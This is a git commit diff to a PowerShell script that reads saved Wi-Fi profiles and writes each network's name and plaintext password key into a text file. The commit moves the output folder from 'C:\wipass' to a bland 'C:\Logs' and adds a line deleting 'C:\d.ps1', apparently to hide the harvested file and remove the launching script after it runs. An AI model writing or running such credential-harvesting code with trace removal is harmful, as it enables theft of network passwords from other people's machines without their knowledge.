d06262d23d86e40a62c9b4ab85236c001191e18e
Tomas Sanjuan <39006479+tomassj9@users.noreply.github.com>
2021-03-18 10:08:58 +0100

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,4 +1,4 @@
-$p = "C:\wipass"
+$p = "C:\Logs"
 mkdir $p
 cd $p
 
@@ -9,3 +9,5 @@ $xml=[xml] (get-content $_)
 $a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
 Out-File wifipass.txt -Append -InputObject $a
 }
+
+rm C:\d.ps1
